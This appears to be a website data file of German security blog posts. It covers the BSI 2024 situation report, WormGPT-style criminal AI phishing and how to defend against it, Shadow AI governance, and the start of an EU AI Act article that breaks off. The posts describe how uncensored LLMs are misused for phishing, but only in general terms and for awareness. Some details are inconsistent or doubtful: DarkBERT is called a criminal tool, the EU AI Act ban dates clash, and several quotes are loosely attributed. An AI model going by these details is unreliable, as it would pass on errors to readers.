    author: 'sicherheit.ai Redaktion',
    authorRole: 'Basierend auf: BSI Lagebericht 2024, bsi.bund.de',
    publishedAt: '2024-11-20',
    readTime: 10,
    imageGradient: 'linear-gradient(135deg, #001220 0%, #001A30 50%, #001220 100%)',
    badge: 'OFFIZIELL',
    badgeColor: '#00F0FF',
    tags: ['BSI', 'Lagebericht', 'Deutschland', 'Ransomware', 'KRITIS', 'Cybersecurity', 'KI-Angriffe'],
    sources: [
      { title: 'BSI: Die Lage der IT-Sicherheit in Deutschland 2024', url: 'https://www.bsi.bund.de/lageberichte' },
      { title: 'BSI Presse: Lagebericht 2024', url: 'https://www.bsi.bund.de/DE/Service-Navi/Presse/Pressemitteilungen/Presse2024/241107_Lagebericht.html' },
      { title: 'BSI: KRITIS-Schutz', url: 'https://www.bsi.bund.de/KRITIS' },
    ],
    faqs: [
      { q: 'Wo finde ich den vollständigen BSI Lagebericht?', a: 'Der vollständige BSI Lagebericht 2024 „Die Lage der IT-Sicherheit in Deutschland 2024" ist kostenlos als PDF auf bsi.bund.de/lageberichte herunterladbar. Das BSI veröffentlicht den Lagebericht jährlich im Oktober/November.' },
      { q: 'Was bedeutet die Bewertung „angespannt bis kritisch"?', a: 'Das BSI nutzt eine vierstufige Skala: normal, angespannt, kritisch, sehr kritisch. „Angespannt bis kritisch" bedeutet dass die Bedrohungslage seit mehreren Jahren anhält und sich in bestimmten Bereichen (KRITIS, Kommunen, Gesundheit) verschärft hat. Es ist keine Entwarnung, aber auch kein Ausnahmezustand.' },
      { q: 'Welche Branchen sind laut BSI besonders gefährdet?', a: 'Laut BSI sind besonders gefährdet: Kommunen und öffentliche Verwaltung (häufig unzureichend abgesichert), Gesundheitssektor (Krankenhäuser), Bildungseinrichtungen, und mittelständische Unternehmen als Teil von Lieferketten größerer Unternehmen.' },
    ],
    content: `<h2 id="ueberblick">BSI Lagebericht 2024: Kernaussagen</h2>
<p>Das Bundesamt für Sicherheit in der Informationstechnik (BSI) ist die zentrale Behörde für Cybersicherheit in Deutschland und veröffentlicht seit 2005 jährlich einen Lagebericht zur IT-Sicherheit. Der <strong>Lagebericht 2024 „Die Lage der IT-Sicherheit in Deutschland 2024"</strong> wurde im November 2024 veröffentlicht.</p>
<p>Die Gesamtbewertung des BSI lautet: Die IT-Sicherheitslage in Deutschland ist weiterhin <strong>angespannt bis kritisch</strong>. Dieser Befund hält sich nun mehrere Jahre in Folge. Das BSI warnt ausdrücklich davor, die anhaltende Lage zu normalisieren.</p>
<blockquote><p>„Die Bedrohungslage im Cyber-Raum ist weiterhin angespannt bis kritisch. Angriffe werden ausgefeilter, die Zahl der Angriffsmöglichkeiten wächst und die potenziellen Schäden steigen."</p><cite>— BSI Lagebericht 2024, Zusammenfassung</cite></blockquote>

<h2 id="hauptbedrohungen">Hauptbedrohungen laut BSI 2024</h2>
<h3 id="ransomware">1. Ransomware — Weiterhin größte Bedrohung</h3>
<p>Ransomware bleibt laut BSI die größte Einzelbedrohung für deutsche Unternehmen, Behörden und kritische Infrastruktur. Besonders alarmierend: Die Angriffe werden gezielter und professioneller. Ransomware-as-a-Service (RaaS) ermöglicht es auch technisch weniger versierten Kriminellen, komplexe Angriffe durchzuführen.</p>
<p>Besonders betroffen sind laut BSI:</p>
<ul>
<li><strong>Kommunen und Landkreise:</strong> Mehrere deutsche Kommunen wurden 2024 durch Ransomware weitgehend handlungsunfähig gemacht</li>
<li><strong>Krankenhäuser und Gesundheitseinrichtungen:</strong> Angriffe auf Gesundheitsinfrastruktur gefährden direkt Menschenleben</li>
<li><strong>Mittelständische Unternehmen (KMU):</strong> Oft schlechter abgesichert als Großunternehmen, aber Teil kritischer Lieferketten</li>
</ul>

<h3 id="ki-angriffe">2. KI-gestützte Angriffe — Neue Qualität der Bedrohung</h3>
<p>Der BSI Lagebericht 2024 widmet KI-gestützten Angriffen erstmals ein eigenständiges Kapitel. Generative KI senkt die Einstiegshürde für Cyberkriminelle erheblich:</p>
<ul>
<li><strong>KI-generiertes Phishing:</strong> Täuschend echte, personalisierte E-Mails in perfektem Deutsch — automatisiert und massenweise</li>
<li><strong>Deepfake-Betrug:</strong> Gefälschte Audio- und Videoaufnahmen von Führungskräften für CEO-Fraud-Angriffe</li>
<li><strong>Automatisierte Schwachstellensuche:</strong> KI-Tools finden und exploiten Sicherheitslücken schneller als bisher möglich</li>
<li><strong>Malware-Generierung:</strong> Large Language Models können bei der Erstellung von Schadsoftware assistieren</li>
</ul>

<h3 id="ddos">3. DDoS-Angriffe — Hacktivismus und staatliche Akteure</h3>
<p>DDoS-Angriffe auf deutsche Infrastruktur haben laut BSI zugenommen, besonders durch hacktivistische Gruppen im Kontext des russischen Angriffskrieges auf die Ukraine. Betroffen sind:</p>
<ul>
<li>Bundesbehörden und parlamentarische Institutionen</li>
<li>Flughäfen und Verkehrsinfrastruktur</li>
<li>Finanzinstitute</li>
<li>Medienhäuser und Nachrichtenportale</li>
</ul>

<h3 id="lieferkette">4. Supply-Chain-Angriffe — Angriffe über Dritte</h3>
<p>Angreifer kompromittieren zunehmend Zulieferer und Dienstleister, um über diese vertrauenswürdige Verbindungen in größere Zielorganisationen einzudringen. Der MOVEit-Angriff 2023 ist das prominenteste internationale Beispiel. Das BSI empfiehlt systematisches Third-Party Risk Management.</p>

<h2 id="kritis">KRITIS: Kritische Infrastruktur unter besonderer Beobachtung</h2>
<p>Das BSI betreibt das KRITIS-Programm zum Schutz kritischer Infrastrukturen. Als KRITIS gelten in Deutschland neun Sektoren: Energie, Wasser, Ernährung, Informationstechnik und Telekommunikation, Gesundheit, Finanz- und Versicherungswesen, Transport und Verkehr, Medien und Kultur, sowie Staat und Verwaltung.</p>
<p>Das BSI hat mit dem <strong>KRITIS-Dachgesetz</strong> (in Umsetzung der NIS-2-Richtlinie) und dem <strong>IT-Sicherheitsgesetz 2.0</strong> die Anforderungen an KRITIS-Betreiber verschärft. Betreiber kritischer Infrastrukturen sind verpflichtet:</p>
<ul>
<li>Erhebliche Cyberangriffe innerhalb von 24 Stunden an das BSI zu melden</li>
<li>Mindeststandards für IT-Sicherheit umzusetzen und nachzuweisen</li>
<li>Systeme zur Angriffserkennung (SzA) einzusetzen</li>
</ul>

<h2 id="nis2">NIS-2-Richtlinie: Erweiterte Meldepflichten für mehr Unternehmen</h2>
<p>Die EU-Richtlinie NIS-2 (Network and Information Security 2) hätte bis Oktober 2024 in deutsches Recht umgesetzt werden sollen. Das entsprechende <strong>NIS-2-Umsetzungsgesetz (NIS2UmsuCG)</strong> befindet sich im deutschen Gesetzgebungsverfahren und wird voraussichtlich 2025 in Kraft treten.</p>
<p>NIS-2 weitet den Kreis betroffener Unternehmen erheblich aus: Wo bisher ca. 2.000 KRITIS-Unternehmen reguliert wurden, werden es mit NIS-2 schätzungsweise <strong>29.000 Unternehmen</strong> in Deutschland sein.</p>
<p>Neue Anforderungen unter NIS-2:</p>
<ul>
<li>Risikomanagementmaßnahmen für Cybersicherheit</li>
<li>Meldepflicht bei Sicherheitsvorfällen (24h Erstmeldung, 72h Detailmeldung, 1 Monat Abschlussbericht)</li>
<li>Persönliche Haftung von Geschäftsführern bei Verstößen</li>
<li>Lieferketten-Sicherheitsanforderungen</li>
</ul>

<h2 id="empfehlungen">BSI-Empfehlungen für Unternehmen</h2>
<p>Das BSI gibt im Lagebericht 2024 folgende Kernempfehlungen:</p>
<ol>
<li><strong>IT-Grundschutz umsetzen:</strong> Das BSI IT-Grundschutz-Kompendium bietet einen vollständigen Rahmen für Sicherheitsmaßnahmen — kostenlos unter bsi.bund.de</li>
<li><strong>Backup-Strategie nach 3-2-1-1-0-Regel:</strong> 3 Kopien, 2 Medientypen, 1 Off-Site, 1 Offline (Air-Gap), 0 ungetestete Backups</li>
<li><strong>Multi-Faktor-Authentifizierung (MFA) überall:</strong> Insbesondere für E-Mail, VPN, Admin-Zugänge und Cloud-Dienste</li>
<li><strong>Patch-Management beschleunigen:</strong> Kritische Schwachstellen (CVSS ≥ 9) innerhalb von 24 Stunden patchen</li>
<li><strong>Mitarbeiterschulungen:</strong> Regelmäßige Security-Awareness-Trainings mit simulierten Phishing-Tests</li>
<li><strong>Incident Response Plan:</strong> Schriftlichen Plan für Sicherheitsvorfälle haben und regelmäßig üben</li>
</ol>`,
  },

  // ── 5. WormGPT ─────────────────────────────────────────────────────────────
  {
    id: 'post-wormgpt-ki-phishing-tool',
    slug: 'wormgpt-ki-phishing-tool',
    title: 'KI Phishing erkennen 2026: WormGPT, FraudGPT & Schutzmaßnahmen für Unternehmen',
    excerpt: 'KI-Phishing ist 2026 der häufigste Angriffsvektor. WormGPT und FraudGPT erstellen täuschend echte Phishing-Mails ohne Sicherheitsgrenzen — 340% Anstieg laut SlashNext. So erkennen und schützen sich Unternehmen konkret.',
    content: `<h2>Was ist WormGPT?</h2>
<p>WormGPT ist ein Large Language Model (LLM), das auf Basis von Open-Source-Modellen entwickelt und speziell auf schädliche Inhalte trainiert wurde. Anders als kommerzielle Modelle wie ChatGPT oder Claude verfügt WormGPT über keinerlei Sicherheitsmechanismen, Inhaltsfilter oder ethische Leitlinien. Es wurde erstmals im Juli 2023 im Darknet-Forum "hackforums" angeboten und richtete sich explizit an Cyberkriminelle.</p>
<p>Das Modell basiert nach Angaben seines Erstellers auf dem Open-Source-Modell GPT-J von EleutherAI, wurde jedoch mit Datensätzen aus dem Bereich Malware, Exploits und Phishing-Korrespondenz nachtrainiert. Das Ergebnis: Ein Sprachmodell, das auf Anfrage professionell formulierte Betrugs-E-Mails, Business Email Compromise (BEC)-Angriffe und Schadcode erstellt, ohne die Anfrage zu verweigern.</p>
<p>WormGPT ist nicht das einzige Modell seiner Art. Nachfolger wie FraudGPT, DarkBERT und EscapeGPT folgen demselben Prinzip. Sie werden im Darknet als Abonnement-Dienst angeboten, oft für 60 bis 200 US-Dollar pro Monat.</p>

<h2>Wie funktioniert WormGPT bei Phishing-Angriffen?</h2>
<p>Der Einsatz von WormGPT in Phishing-Kampagnen folgt einem strukturierten Ablauf, der traditionelle, manuell erstellte Phishing-Mails in mehrfacher Hinsicht übertrifft.</p>
<h3>Schritt 1: Zielgerichtete Personalisierung</h3>
<p>Angreifer füttern WormGPT mit öffentlich verfügbaren Informationen über das Opfer: LinkedIn-Profile, Unternehmenswebseiten, Pressemitteilungen, E-Mail-Signaturen. Das Modell generiert daraus eine E-Mail, die spezifisch auf die Rolle, den Arbeitgeber und aktuelle Ereignisse im Leben des Opfers zugeschnitten ist.</p>
<h3>Schritt 2: Fehlerfreie Sprache in jeder Sprache</h3>
<p>Klassische Phishing-Mails sind oft durch schlechte Grammatik erkennbar. WormGPT erstellt fehlerfreie, stilistisch konsistente Texte in Deutsch, Englisch, Französisch und zahlreichen anderen Sprachen. Das Sicherheitsmerkmal "schlechtes Deutsch" entfällt vollständig.</p>
<h3>Schritt 3: Business Email Compromise (BEC)</h3>
<p>WormGPT wurde in einer Analyse der Sicherheitsfirma SlashNext speziell auf BEC-Angriffe getestet. Das Ergebnis waren E-Mails, die vorgeben, von Vorgesetzten oder Geschäftspartnern zu stammen, und Mitarbeiter zur dringenden Überweisung von Geldbeträgen oder zur Weitergabe von Zugangsdaten auffordern. Die generierten Texte waren laut SlashNext "besorgniserregend effektiv".</p>

<h2>Warum ist WormGPT gefährlicher als traditionelles Phishing?</h2>
<p>Laut dem SlashNext State of Phishing Report 2023 verzeichnete die Sicherheitsbranche seit der Verfügbarkeit von WormGPT und ähnlichen Tools einen Anstieg von <strong>340% bei KI-generierten Phishing-Angriffen</strong>. Dieser Anstieg erklärt sich durch mehrere strukturelle Vorteile, die KI-gestütztes Phishing gegenüber traditionellen Methoden besitzt.</p>
<ul>
<li><strong>Skalierbarkeit:</strong> Ein einzelner Angreifer kann mit WormGPT innerhalb von Minuten Tausende individualisierter Phishing-Mails erstellen, die früher einen ganzen Tag manuelle Arbeit erfordert hätten.</li>
<li><strong>Niedrige Einstiegshürde:</strong> Technisches Wissen ist kaum erforderlich. WormGPT wird mit einfachen Textprompts gesteuert, ähnlich wie ein normaler Chatbot.</li>
<li><strong>Überwindung klassischer Erkennungsmuster:</strong> Spam-Filter und E-Mail-Security-Lösungen sind auf statistische Muster in Phishing-Mails trainiert. KI-generierte Texte weichen von diesen Mustern ab und umgehen Filter häufiger.</li>
<li><strong>Kombinierbarkeit mit anderen Tools:</strong> WormGPT wird oft in Kombination mit OSINT-Tools, geleakten Datenbankdumps und automatisierten Versandinfrastrukturen genutzt, was vollautomatisierte Angriffskampagnen ermöglicht.</li>
</ul>
<p>Proofpoint berichtet in seinem Human Factor Report 2023, dass BEC-Angriffe bereits vor der KI-Welle jährlich Schäden von über 50 Milliarden US-Dollar verursacht haben. Die Verfügbarkeit von WormGPT beschleunigt diesen Trend erheblich.</p>

<h2>Wie erkennt man KI-generierte Phishing-Mails?</h2>
<p>Die klassischen Erkennungsmerkmale für Phishing – Rechtschreibfehler, unpersönliche Anrede, generische Inhalte – greifen bei WormGPT-Mails nicht mehr zuverlässig. Dennoch gibt es Hinweise, auf die Empfänger achten können.</p>
<h3>Inhaltliche Warnsignale</h3>
<ul>
<li>Ungewöhnliche Dringlichkeit: "Sofortige Überweisung erforderlich", "Handeln Sie innerhalb von 2 Stunden"</li>
<li>Aufforderungen, normale Prozesse zu umgehen ("Bitte senden Sie direkt an mich, nicht über das System")</li>
<li>Anfragen, die von der normalen Kommunikationsstruktur abweichen (CEO schreibt plötzlich direkt an Buchhalter)</li>
<li>Links zu Domains, die der echten Unternehmensadresse ähneln, aber leicht abweichen (z.B. company-de.com statt company.com)</li>
</ul>
<h3>Technische Prüfmethoden</h3>
<ul>
<li>E-Mail-Header analysieren: Stimmt die Absenderadresse mit dem angezeigten Namen überein?</li>
<li>DMARC, DKIM und SPF-Prüfung: Wurde die E-Mail tatsächlich vom angegebenen Server gesendet?</li>
<li>Links vor dem Klicken per Hover oder separatem Sicherheitstool überprüfen</li>
<li>Verifizierung über alternativen Kanal: Den angeblichen Absender per Telefon oder persönlich bestätigen</li>
</ul>

<h2>Schutzmaßnahmen für Unternehmen und Privatpersonen</h2>
<p>Angesichts der verbesserten Qualität von KI-Phishing müssen Schutzmaßnahmen über reine Erkennungslogik hinausgehen.</p>
<ul>
<li><strong>Multi-Faktor-Authentifizierung (MFA):</strong> Selbst wenn Zugangsdaten durch Phishing erbeutet werden, verhindert MFA den Zugriff auf Konten. CISA empfiehlt MFA als Basisschutz für alle Organisationen.</li>
<li><strong>Security Awareness Training:</strong> Mitarbeiter müssen regelmäßig auf aktuelle Phishing-Methoden geschult werden. Simulierte Phishing-Tests erhöhen die Erkennungsrate nachweislich.</li>
<li><strong>E-Mail-Security-Gateway:</strong> Lösungen wie Proofpoint, Mimecast oder Microsoft Defender for Office 365 analysieren eingehende Mails auf verdächtige Muster, auch bei KI-generierten Texten.</li>
<li><strong>Zero-Trust-Prinzip bei Überweisungen:</strong> Jede Zahlungsanforderung per E-Mail muss durch einen zweiten, unabhängigen Kanal bestätigt werden, unabhängig vom angeblichen Absender.</li>
<li><strong>DMARC-Richtlinien:</strong> Unternehmen sollten DMARC auf "reject" setzen, um zu verhindern, dass ihre Domain für gefälschte Absenderadressen missbraucht wird.</li>
<li><strong>Incident Response Plan:</strong> Im Falle eines erfolgreichen Angriffs muss ein klarer Prozess für Sofortmaßnahmen, Meldepflichten und Kommunikation vorhanden sein.</li>
</ul>
<blockquote>
<p>"Die Frage ist nicht mehr ob KI-gestütztes Phishing Ihre Organisation trifft, sondern wann. Die Vorbereitung entscheidet über den Schaden." – CISA Cybersecurity Advisory, 2023</p>
</blockquote>`,
    category: 'KI-Bedrohung',
    categoryColor: '#FF3B5C',
    categoryBg: 'rgba(255,59,92,0.1)',
    author: 'sicherheit.ai Redaktion',
    authorRole: 'Basierend auf: SlashNext State of Phishing Report 2023, Proofpoint Human Factor Report 2023, CISA',
    publishedAt: '2026-05-10',
    readTime: 10,
    imageGradient: 'linear-gradient(135deg, #1A0008 0%, #2D000F 40%, #1A0008 100%)',
    imageAlt: 'WormGPT Phishing KI-Tool Visualisierung',
    badge: 'NEU',
    badgeColor: '#FF3B5C',
    tags: ['WormGPT', 'Phishing', 'KI-Bedrohung', 'BEC', 'E-Mail-Sicherheit', 'Darknet-KI'],
    faqs: [
      { q: 'Ist WormGPT noch aktiv verfügbar?', a: 'Der ursprüngliche Entwickler von WormGPT hat den Dienst im August 2023 eingestellt, jedoch sind zahlreiche Nachfolgemodelle wie FraudGPT, DarkBERT und weitere im Darknet weiterhin aktiv und werden als Abonnement-Dienst angeboten. Die Verfügbarkeit dieser Tools ist dauerhaft und nimmt zu.' },
      { q: 'Wie unterscheidet sich WormGPT von ChatGPT?', a: 'ChatGPT und vergleichbare kommerzielle Modelle verfügen über umfangreiche Sicherheitsmechanismen und Inhaltsfilter, die das Erstellen von Phishing-Mails oder Schadcode verhindern. WormGPT wurde gezielt ohne diese Filter trainiert und verweigert keine schädlichen Anfragen. Es ist außerdem auf Malware-Datensätze spezialisiert, was seine Ausgaben in diesem Bereich effektiver macht.' },
      { q: 'Kann ein Anti-Spam-Filter KI-generierte Phishing-Mails erkennen?', a: 'Klassische regelbasierte Spam-Filter versagen häufig bei KI-generierten Mails, da diese keine typischen Phishing-Muster wie Rechtschreibfehler oder bekannte Absender-Blacklists aufweisen. Moderne KI-gestützte E-Mail-Security-Lösungen mit verhaltensbasierter Analyse sind deutlich effektiver, bieten aber ebenfalls keinen vollständigen Schutz. Die menschliche Überprüfung bleibt unverzichtbar.' },
      { q: 'Was sollte ich tun, wenn ich eine verdächtige E-Mail erhalte?', a: 'Klicken Sie auf keine Links und öffnen Sie keine Anhänge. Verifizieren Sie den angeblichen Absender über einen unabhängigen Kanal (Telefon, persönlicher Kontakt). Melden Sie die E-Mail Ihrer IT-Abteilung oder Ihrem E-Mail-Anbieter. Im Zweifelsfall gilt: Lieber einmal zu viel nachfragen als einmal zu wenig.' },
      { q: 'Sind kleine Unternehmen auch Ziele von WormGPT-Phishing?', a: 'Ja, Cyberkriminelle nutzen KI-Tools wie WormGPT explizit, um Angriffe zu skalieren und auch kleinere Unternehmen anzugreifen, die bislang aufgrund des manuellen Aufwands für Einzelangriffe uninteressant waren. Die niedrigen Kosten und hohe Automatisierung machen es wirtschaftlich, auch Unternehmen mit wenigen Mitarbeitern gezielt anzugreifen.' },
    ],
    sources: [
      { title: 'SlashNext State of Phishing Report 2023', url: 'https://slashnext.com/state-of-phishing-2023/' },
      { title: 'Proofpoint Human Factor Report 2023', url: 'https://www.proofpoint.com/us/resources/threat-reports/human-factor' },
      { title: 'CISA Phishing Guidance', url: 'https://www.cisa.gov/topics/cyber-threats-and-advisories/phishing' },
    ],
  },

  // ── 6. Shadow AI ────────────────────────────────────────────────────────────
  {
    id: 'post-shadow-ai-unternehmen-risiken',
    slug: 'shadow-ai-unternehmen-risiken',
    title: 'Shadow AI erkennen & kontrollieren: 44% der deutschen Unternehmen bereits betroffen',
    excerpt: '44% der deutschen Unternehmen melden Sicherheitsverletzungen durch Shadow AI — unkontrollierte KI-Nutzung kostet durchschnittlich 670.000 € pro Vorfall. So erkennen, bewerten und stoppen Sie Shadow AI in Ihrem Unternehmen.',
    content: `<h2>Was ist Shadow AI?</h2>
<p>Shadow AI ist ein Phänomen, das sich aus dem älteren Konzept der "Shadow IT" ableitet: Mitarbeiter nutzen Softwaretools und digitale Dienste, die von der IT-Abteilung weder genehmigt noch kontrolliert werden. Im Kontext künstlicher Intelligenz bedeutet dies den Einsatz von KI-Anwendungen wie ChatGPT, Google Gemini, Claude, Copilot oder spezialisierten KI-Tools für Bildgenerierung, Transkription und Datenanalyse, ohne dass die IT-Abteilung darüber informiert ist oder diese Nutzung in die Sicherheitsarchitektur des Unternehmens eingebettet ist.</p>
<p>Das Ausmaß ist erheblich: Laut einer Umfrage von Salesforce aus dem Jahr 2024 nutzen <strong>55% der Mitarbeiter KI-Tools bei der Arbeit</strong>, und über die Hälfte davon tut dies ohne explizite Genehmigung des Arbeitgebers. Eine separate Studie von Cyberhaven aus dem Jahr 2023 zeigte, dass 10,7% aller in ChatGPT eingegebenen Daten als vertraulich klassifiziert werden könnten.</p>
<p>Shadow AI entsteht nicht aus böser Absicht. Mitarbeiter suchen nach effektiveren Wegen, ihre Arbeit zu erledigen, und KI-Tools bieten echte Produktivitätsgewinne. Das Problem liegt in der fehlenden Kontrolle über die Datenweitergabe, die Verarbeitung durch Drittanbieter und die Qualität der KI-Ausgaben.</p>

<h2>Konkrete Risiken durch Shadow AI im Unternehmensumfeld</h2>
<h3>Datenlecks und Verlust von Geschäftsgeheimnissen</h3>
<p>Wenn Mitarbeiter vertrauliche Unternehmensinformationen in externe KI-Dienste eingeben, verlassen diese Daten die Kontrolle des Unternehmens. Viele KI-Anbieter nutzen eingegebene Daten standardmäßig zum Training ihrer Modelle, sofern Nutzer dies nicht explizit deaktivieren. Samsung musste im April 2023 die Nutzung von ChatGPT intern sperren, nachdem Mitarbeiter in kurzer Zeit dreimal vertraulichen Quellcode und Besprechungsnotizen in das System eingegeben hatten.</p>
<h3>DSGVO-Verstöße und regulatorisches Risiko</h3>
<p>Die Weitergabe personenbezogener Daten an externe KI-Dienste ohne entsprechende Datenverarbeitungsvereinbarungen (DPA) verstößt gegen die Datenschutz-Grundverordnung. Besonders kritisch: Kundendaten, Personalakten oder medizinische Informationen dürfen nicht ohne Rechtsgrundlage an Drittanbieter übermittelt werden.</p>
<h3>Unkontrollierte und fehlerhafte KI-Outputs</h3>
<p>KI-Modelle produzieren Fehler, sogenannte Halluzinationen. Wenn Mitarbeiter KI-generierte Inhalte ohne Überprüfung in Berichte, Angebote oder Kundenkommunikation übernehmen, entstehen Qualitätsprobleme und Haftungsrisiken.</p>
<h3>Lizenzverletzungen und rechtliche Risiken</h3>
<p>KI-generierte Texte, Bilder und Code können urheberrechtlich geschütztem Material ähneln. Unternehmen, die solche Outputs ohne Kenntnis der Herkunft verwenden, setzen sich rechtlichen Risiken aus, ohne es zu wissen.</p>

<h2>Wie Unternehmen Shadow AI erkennen</h2>
<ul>
<li><strong>Netzwerk-Monitoring:</strong> Analyse des ausgehenden Datenverkehrs auf Verbindungen zu bekannten KI-Diensten (OpenAI-API, Anthropic, Google AI-Endpunkte, Midjourney etc.)</li>
<li><strong>Browser-Plugin-Inventur:</strong> Viele KI-Tools werden als Browser-Erweiterungen genutzt. Eine Inventur installierter Plugins auf Unternehmensgeräten deckt Shadow-AI-Nutzung auf.</li>
<li><strong>Mitarbeiterbefragungen:</strong> Anonyme Umfragen zur genutzten Software liefern oft ehrlichere Ergebnisse als technisches Monitoring.</li>
<li><strong>SaaS-Discovery-Tools:</strong> Spezialisierte Tools wie Torii, BetterCloud oder Productiv analysieren OAuth-Verbindungen und SaaS-Nutzung in Unternehmensumgebungen.</li>
</ul>

<h2>AI-Governance einführen: Der strukturierte Ansatz</h2>
<p>Das Ziel einer AI-Governance-Strategie ist nicht das Verbot von KI-Tools, sondern deren kontrollierte Integration. Ein Verbot ohne Alternative treibt die Nutzung weiter in den Schatten.</p>
<h3>Schritt 1: KI-Richtlinie entwickeln</h3>
<p>Eine klare, schriftliche Richtlinie definiert, welche KI-Tools erlaubt sind, welche Datenklassen nicht eingegeben werden dürfen und welche Ausgaben einer Überprüfung bedürfen.</p>
<h3>Schritt 2: Genehmigte Tools bereitstellen</h3>
<p>Unternehmen sollten sichere, datenschutzkonforme KI-Lösungen anbieten, die Mitarbeiterbedürfnisse erfüllen. Microsoft Copilot for Microsoft 365, Google Workspace Gemini oder selbst gehostete Modelle bieten KI-Funktionalität mit Unternehmenskontrolle.</p>
<h3>Schritt 3: Schulung und Bewusstseinsbildung</h3>
<p>Mitarbeiter müssen verstehen, warum bestimmte Tools riskant sind, nicht nur, dass sie verboten sind.</p>
<h3>Schritt 4: Kontinuierliches Monitoring</h3>
<p>Das KI-Tool-Ökosystem verändert sich wöchentlich. Regelmäßige Reviews der genutzten Tools und kontinuierliches Netzwerk-Monitoring sind erforderlich.</p>
<blockquote>
<p>"Unternehmen, die KI-Nutzung verbieten ohne Alternativen anzubieten, verlieren den Produktivitätsvorteil und haben die Sicherheitsrisiken trotzdem. Die Lösung ist kontrolliertes Enablement, keine Prohibition." – Gartner IT-Report 2024</p>
</blockquote>`,
    category: 'Unternehmensrisiko',
    categoryColor: '#A78BFA',
    categoryBg: 'rgba(167,139,250,0.1)',
    author: 'sicherheit.ai Redaktion',
    authorRole: 'Basierend auf: Salesforce AI Survey 2024, Cyberhaven Research 2023, Gartner IT-Report 2024',
    publishedAt: '2026-05-09',
    readTime: 9,
    imageGradient: 'linear-gradient(135deg, #0D0A1A 0%, #1A1040 40%, #0D0A1A 100%)',
    imageAlt: 'Shadow AI Unternehmensrisiko Visualisierung',
    tags: ['Shadow AI', 'KI-Governance', 'DSGVO', 'Datenleck', 'Unternehmensrisiko', 'Shadow IT'],
    faqs: [
      { q: 'Ist die private Nutzung von ChatGPT durch Mitarbeiter automatisch ein Problem?', a: 'Es kommt auf den Inhalt an. Die Nutzung von ChatGPT für allgemeine Recherchen oder zum Erstellen von Textentwürfen ohne vertrauliche Unternehmensdaten ist in der Regel unkritisch. Problematisch wird es, wenn Kundendaten, interne Finanzzahlen, Quellcode oder andere vertrauliche Informationen eingegeben werden.' },
      { q: 'Was ist der Unterschied zwischen Shadow AI und genehmigter KI-Nutzung?', a: 'Bei genehmigter KI-Nutzung hat die IT-Abteilung den Dienst geprüft, eine Datenverarbeitungsvereinbarung mit dem Anbieter abgeschlossen, Datenschutzeinstellungen konfiguriert und Richtlinien für den Umgang mit Outputs definiert. Shadow AI fehlt dieser gesamte Rahmen.' },
      { q: 'Welche Branchen sind besonders von Shadow AI betroffen?', a: 'Branchen mit hohem regulatorischen Druck und gleichzeitig großem Produktivitätsdruck sind am stärksten gefährdet: Finanzdienstleistungen, Gesundheitswesen, Rechtsberatung und Unternehmensberatung.' },
      { q: 'Können Unternehmen für Shadow-AI-Verstöße ihrer Mitarbeiter haftbar gemacht werden?', a: 'Ja. Nach DSGVO ist das Unternehmen als Verantwortlicher für die Datenverarbeitung haftbar, unabhängig davon, ob ein Mitarbeiter eigenständig handelt. Die Aufsichtsbehörden prüfen, ob das Unternehmen ausreichende technische und organisatorische Maßnahmen implementiert hat.' },
      { q: 'Wie lange dauert die Implementierung einer AI-Governance-Strategie?', a: 'Eine Basisrichtlinie und erste Schulungen können innerhalb von zwei bis vier Wochen entwickelt werden. Die vollständige Implementierung mit technischem Monitoring, genehmigten Tool-Alternativen und regelmäßigen Review-Prozessen benötigt typischerweise drei bis sechs Monate.' },
    ],
    sources: [
      { title: 'Salesforce State of AI Research 2024', url: 'https://www.salesforce.com/news/stories/ai-at-work-research/' },
      { title: 'Cyberhaven AI Data Report 2023', url: 'https://www.cyberhaven.com/blog/4-2-of-workers-have-pasted-company-data-into-chatgpt' },
      { title: 'Gartner Top Strategic Technology Trends 2024', url: 'https://www.gartner.com/en/information-technology/insights/top-technology-trends' },
    ],
  },

  // ── 7. EU AI Act verbotene Systeme ──────────────────────────────────────────
  {
    id: 'post-eu-ai-act-verbotene-ki-systeme',
    slug: 'eu-ai-act-verbotene-ki-systeme',
    title: 'EU AI Act Checkliste 2026: Verbotene KI-Systeme, Pflichten & Bußgelder für Unternehmen',
    excerpt: 'EU AI Act Checkliste für Unternehmen: Welche KI-Systeme sind ab August 2026 verboten? Social Scoring, Echtzeit-Biometrie, unterschwellige Manipulation — Bußgelder bis 35 Mio. €. Mit praktischer Compliance-Checkliste.',
    content: `<h2>Was ist der EU AI Act?</h2>
<p>Der EU Artificial Intelligence Act (EU AI Act) ist die weltweit erste umfassende gesetzliche Regulierung für künstliche Intelligenz. Er wurde am 13. März 2024 vom Europäischen Parlament verabschiedet und trat am 1. August 2024 in Kraft. Das Gesetz verfolgt einen risikobasierten Ansatz: KI-Systeme werden in vier Risikokategorien eingeteilt, von unakzeptablem Risiko (verboten) über Hochrisiko (streng reguliert) bis zu minimalem Risiko (kaum Anforderungen).</p>
<p>Der EU AI Act gilt für alle Anbieter, die KI-Systeme in der EU in Verkehr bringen, unabhängig davon, ob das Unternehmen seinen Sitz in der EU hat. Die Umsetzung erfolgt gestaffelt: Erste Verbote gelten ab Februar 2025.</p>

<h2>Vollständig verbotene KI-Systeme (Artikel 5)</h2>
<p>Artikel 5 des EU AI Act listet KI-Anwendungen auf, die als Bedrohung für Grundrechte eingestuft werden und in der EU vollständig verboten sind. Diese Verbote gelten ab <strong>2. Februar 2025</strong>.</p>
<h3>1. KI-basiertes Social Scoring</h3>
<p>Verboten sind KI-Systeme, die das Verhalten natürlicher Personen oder sozialer Gruppen bewerten und auf Basis dieser Bewertung zu Benachteiligungen führen. Dies betrifft insbesondere staatliche Social-Credit-Systeme, aber auch privatwirtschaftliche Scoring-Systeme, die über legitime Kreditwürdigkeitsprüfungen hinausgehen.</p>
<h3>2. Unterschwellige Manipulation</h3>
<p>KI-Systeme, die Techniken einsetzen, die außerhalb des Bewusstseins einer Person wirken (subliminale Techniken), um das Verhalten von Personen auf eine Weise zu beeinflussen, die ihnen schaden kann, sind verboten.</p>
<h3>3. Biometrische Kategorisierung für sensible Merkmale</h3>
<p>Verboten ist die Nutzung biometrischer Kategorisierungssysteme, die natürliche Personen anhand sensibler Merkmale wie politischer oder religiöser Überzeugung, sexueller Orientierung oder Rasse einteilen.</p>
<h3>4. Echtzeit-Biometrie im öffentlichen Raum (mit Ausnahmen)</h3>
